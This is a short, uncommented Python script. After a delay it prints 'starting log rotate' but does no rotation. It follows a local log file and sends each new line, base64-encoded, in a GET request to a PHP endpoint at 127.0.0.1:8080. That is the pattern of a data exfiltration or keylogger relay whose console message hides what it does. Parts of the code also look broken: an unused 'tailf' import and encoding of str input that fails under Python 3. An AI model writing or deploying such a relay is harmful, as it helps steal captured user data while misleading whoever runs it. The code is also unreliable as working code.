import requests
import base64
import sys
import tailf 
import time
fn = "local_log.txt"
time.sleep(20)
def watch(fn):
    fp = open(fn, 'r')
    while True:
        new = fp.readline()
        # Once all lines are read this just returns ''
        # until the file changes and a new line appears

        if new:
            yield new
        else:
            time.sleep(0.5)
print("starting log rotate")          
for line in watch(fn):
    r = requests.get('http://127.0.0.1:8080/tfpw.php?data=' + str(base64.b64encode(line)))
            
